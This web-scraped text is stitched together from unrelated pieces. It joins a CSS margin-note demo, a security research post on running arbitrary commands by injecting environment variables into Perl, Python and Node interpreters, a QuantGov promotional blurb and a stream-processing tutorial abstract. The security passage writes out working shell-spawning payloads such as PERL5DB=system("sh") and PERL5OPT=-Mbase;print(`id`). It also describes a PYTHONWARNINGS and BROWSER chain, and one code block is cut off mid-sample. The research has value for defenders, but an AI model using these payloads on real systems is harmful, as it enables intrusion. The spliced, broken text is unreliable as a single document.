        <p>If you want a sidenote without footnote-style numberings, then you want a margin note.
          <label for="mn-demo">⊕</label>
          
          <span>
            This is a margin note. Notice there isn’t a number preceding the note.
          </span> On large screens, a margin note is just a sidenote that omits the reference number. This lessens the distracting effect taking away from the flow of the main text, but can increase the cognitive load of matching a margin note to its referent text. However, on small screens, a margin note is like a sidenote except its viewability-toggle is a symbol rather than a reference number. This document currently uses the symbol ⊕ (<code>&amp;#8853;</code>), but it’s up to you.</p>
        <p>Margin notes are created just like sidenotes, but with the <code>marginnote</code> class for the content and the <code>margin-toggle</code> class for the label and dummy checkbox. For instance, here is the code for the margin note used in the previous paragraph:</p>
        <pre><code>&lt;label for="mn-demo" class="margin-toggle"&gt;&amp;#8853;&lt;/label&gt;
&lt;input type="checkbox" id="mn-demo" class="margin-toggle"/&gt;
&lt;span class="marginnote"&gt;
  This is a margin note. Notice there isn’t a number preceding the note.
&lt;/span&gt;</code></pre>

<p>On a recent project we gained the ability to specify environment variables but not the process that was executed.
We were also unable to control the contents of a file on disk, and bruteforcing process identifiers (PIDs) and file descriptors found no interesting results, eliminating <a href="https://www.elttam.com/blog/goahead/">remote LD_PRELOAD exploitation</a>.
Fortunately, a scripting language interpreter was executed which enabled us to execute arbitrary commands by specifying particular environment variables.
This blog post discusses how arbitrary commands can be executed by a range of scripting language interpreters when supplied with malicious environment variables.</p>



<p>A quick read of the <code>ENVIRONMENT</code> section of the <code>perlrun(1)</code> man page reveals plenty of environment variables worth investigating.
The <code>PERL5OPT</code> environment variable allows specifying command-line options, but is restricted to only accepting the options <code>CDIMTUWdmtw</code>.
This unfortunately means that <code>-e</code>, which allows supplying perl code to run, is out.</p>

<p>All is not lost though, as demonstrated in the <a href="https://github.com/HackerFantastic/exploits/blob/master/cve-2016-1531.sh">exploit</a> for CVE-2016-1531 by <a href="https://twitter.com/hackerfantastic">Hacker Fantastic</a>.
The exploit writes a malicious perl module to <code>/tmp/root.pm</code> and supplies the environment variables <code>PERL5OPT=-Mroot</code> and <code>PERL5LIB=/tmp</code> to achieve arbitrary code execution.
However this was an exploit for a local privilege escalation vulnerability and a generic technique should ideally not require access to the file system. Looking at <a href="https://twitter.com/bl4sty">blasty</a>’s <a href="https://haxx.in/blasty-vs-exim.sh">exploit</a> for the same CVE, the exploit did not require creating a file and used the environment variables <code>PERL5OPT=-d</code> and <code>PERL5DB=system("sh");exit;</code>.
The same environment variables were also used to <a href="https://old.reddit.com/r/netsec/comments/1dm8fv/hack_this_website_and_win_bitcoins_the_first/c9tm6j4/">solve a CTF challenge</a> in 2013.</p>

<p>One final nicety of a generic technique would be to use a single environment variable instead of two.
<a href="https://twitter.com/justinsteven">@justinsteven</a> found this was possible by leveraging <code>PERL5OPT=-M</code>.
While either <code>-m</code> or <code>-M</code> can be used to load a perl module, the <code>-M</code> option allows adding extra code after the module name.</p>

<p>Reading the <code>ENVIRONMENT VARIABLES</code> section of the <code>python(1)</code> man page, <code>PYTHONSTARTUP</code> initially appears like it may be a piece of a straightforward solution.
It allows specifying a path to a Python script that will be executed prior to displaying the prompt in interactive mode.
The interactive mode requirement didn’t seem like it would be an issue as the <code>PYTHONINSPECT</code> environment variable can be used to enter interactive mode, the same as specifying <code>-i</code> on the command line.
However, the documentation for the <code>-i</code> option explains that <code>PYTHONSTARTUP</code> will not be used when python is started with a script to execute.
This means that <code>PYTHONSTARTUP</code> and <code>PYTHONINSPECT</code> cannot be combined and <code>PYTHONSTARTUP</code> only has an effect when the python REPL is immediately launched.
This ultimately means that <code>PYTHONSTARTUP</code> is not viable as it has no effect when executing a regular Python script.</p>

<p>Other environment variables which looked promising were <code>PYTHONHOME</code> and <code>PYTHONPATH</code>. Both of these will let you gain arbitrary code execution but require you to also be able to create directories and files on the filesystem. It may be possible to loosen those requirements through the use of the proc filesystem and/or ZIP files.</p>

<p>The majority of the remaining environment variables are simply checked if they contain a non-empty string, and if so, toggle a generally benign setting. One of the rare exceptions to this is <code>PYTHONWARNINGS</code>.</p>

<h2 id="making-progress-with-pythonwarnings">Making progress with PYTHONWARNINGS</h2>
<p>The documentation for <code>PYTHONWARNINGS</code> states <code>it is equivalent to specifying the -W option</code>. The <code>-W</code> option is used for warning control to specify which warnings and how often they are printed. The full form of argument is <code>action:message:category:module:line</code>. While warning control didn’t seem like a promising lead, that quickly changed after checking the implementation.</p>

<span>[...]</span></code></pre></figure>

</figure>

<p>The above code shows that as long as our specified category contains a dot, we can trigger the import an arbitrary Python module.</p>

<p>The next problem is that the vast majority of modules from Python’s standard library run very little code when imported. They tend to just define classes to be used later, and even when they provide code to run, the code is typically <a href="https://docs.python.org/3/library/__main__.html">guarded with a check of the <code>__main__</code> variable</a> (to detect if the file has been imported or run directly).</p>

<p>An unexpected exception to this is the <a href="https://xkcd.com/353/">antigravity module</a>. The Python developers included an <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)">easter egg</a> in <a href="https://github.com/python/cpython/commit/206e3074d34aeb5a4d0c1e24d970b6569f7ad702">2008</a> which can be triggered by running <code>import antigravity</code>. This import will immediately open your browser to the xkcd comic that joked that <code>import antigravity</code> in Python would grant you the ability to fly.</p>

<p>As for how the <code>antigravity</code> module opens your browser, it uses another module from the standard library called <code>webbrowser</code>. This module checks your PATH for a large variety of browsers, including mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx. It also accepts an environment variable <code>BROWSER</code> that lets you specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the xkcd comic URL is the one hard-coded argument for the command.</p>

<p>The ability to turn this into arbitrary code execution depends on what other executables are available on the system.</p>

<h2 id="leveraging-perl-for-arbitrary-code-execution">Leveraging Perl for Arbitrary Code Execution</h2>

<p>One approach is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the <code>perl</code> binary cannot itself be used. This is because the first and only argument is the xkcd comic URL. The comic URL argument will cause an error and the process to exit without the <code>PERL5OPT</code> environment variable being used.</p>

<figure>
  <figcaption>Figure-2: PERL5OPT having no effect when a URL is passed to perl</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perl https://xkcd.com/353/
<span>Can't open perl script "https://xkcd.com/353/": No such file or directory</span></code></pre></figure>

</figure>

<p>Fortunately, when Perl is available it also common to have the default Perl scripts available, such as perldoc and perlthanks. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the <code>PERL5OPT</code> environment variable. This means you can leverage the Perl environment variable payload detailed earlier in this blog post.</p>

<p>A <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">blog post</a> by <a href="https://twitter.com/securitymb">Michał Bentkowski</a> provided a payload for exploiting Kibana (CVE-2019-7609). A prototype pollution vulnerability was used to set arbitrary environment variables which resulted in arbitrary command execution. Michał’s payload used the <code>NODE_OPTIONS</code> environment variable and the <a href="https://en.wikipedia.org/wiki/Procfs">proc filesystem</a>, specifically <code>/proc/self/environ</code>.</p>

<p>Although Michał’s technique was creative and worked perfectly for their vulnerability, the technique is not always guaranteed to work and has some constraints that would be nice to remove.</p>

<p>The first constraint is that it using <code>/proc/self/environ</code> is only viable if the contents can be made to be syntactically valid JavaScript. This requires being able to create an environment variable and have it appear first in the contents of <code>/proc/self/environ</code>, or knowing/bruteforcing the environment variable’s name that will appear first and overwriting it’s value.</p>

<p>Another constraint, as the first environment variable’s value finishes with a single line comment (<code>//</code>). Therefore, any newline character in other environment variables will likely cause a syntax error and prevent the payload from executing. The use of multi-line comments (<code>/*</code>) will not fix this issue as they must be closed to be syntactically valid. Therefore, in the rare case that an environment variable contains a newline character, it is required to know/bruteforce the environment variable’s name and overwrite it’s value to a new value that does not contain a newline.</p>

<p>Removing these contraints is an exercise left for the reader.</p>

Visualize, download, explore, and create your own QuantGov data below.</em></p><p>Federal, state, and local governments produce enormous amounts of policy text, including the text of laws, regulations, trade agreements, treaties, court decisions, and even public speeches. It is almost impossible for any one human, or team of humans, to gain insights from such large bodies of text. For example, it would take the average person over three years to read the entire US Code of Federal Regulations (CFR), which contains more than 100 million words and counting. And that is just the reading component. Not comprehension, not quantification, and not analysis.</p><p><em>QuantGov solves the problem of quantifying large amounts of policy text for research and comprehension by using machine learning and natural language processing.</em></p><p>At its core, QuantGov is an open-source policy analytics platform designed to help create greater understanding and analysis of the breadth of government actions through quantifying policy text. By using the platform, researchers can quickly and effectively retrieve unique data that lies embedded in large bodies of text - data on text complexity, part of speech metrics, topic modeling, etc. The platform opens up new lines of research in areas rarely explored before. Helping everyone from the policymaker to the professor gain a broad, yet detailed picture of government policies, allowing for scientific testing assumptions of these policies’ causes and effects.</p><h3>What Can QuantGov Actually Do?</h3><p>QuantGov is a tool designed to make policy text more accessible. Think about it in terms of a hyper-powerful Google search that not only finds (1) specified content within massive quantities of text, but (2) also finds patterns and groupings and can even make predictions about what is in a document. Some recent use cases include the following:</p><ul data-rte-list="default"><li><p>Analyzing state regulatory codes and predicting which parts of those codes are related to occupational licensing….And predicting which occupation the regulation is talking about….And determining the cost to receive the license.</p></li><li><p>Analyzing Canadian province regulatory code while grouping individual regulations by industry-topic….And determining which Ministers are responsible for  those regulations….And determining the complexity of the text for those regulation.</p></li><li><p>Quantifying the number of tariff exclusions that exists due to the Trade Expansion Act of 1962 and recent tariff polices….And determining which products those exclusions target.</p></li><li><p>Comparing the regulatory codes and content of 46 US states, 11 Canadian provinces, and 7 Australian states….While using consistent metrics that can lead to insights that provide legitimate policy improvements.</p></li></ul><h3>What Can You Do With QuantGov Products?</h3><p>Below is a video that describes how an individual can use RegData, a flagship QuantGov product, to answer questions about regulations.</p></div></div></div></div></div>

<h2 id="overview">Overview</h2>
<p>Stream processing has been an active research field for more than 20 years, but it is now witnessing its prime time due to recent successful efforts by the research community and numerous worldwide open-source communities. The goal of this tutorial is threefold. First, we aim to review and highlight noteworthy past research findings, which were largely ignored until very recently. Second, we intend to underline the differences between early (’00-’10) and modern (’11-’18) streaming systems, and how those systems have evolved through the years. Most importantly, we wish to turn the attention of the database community to recent trends: streaming systems are no longer used only for classic stream processing workloads, namely window aggregates and joins. Instead, modern streaming systems are being increasingly used to deploy general event-driven applications in a scalable fashion, challenging the design decisions, architecture and intended use of existing stream processing systems.</p>
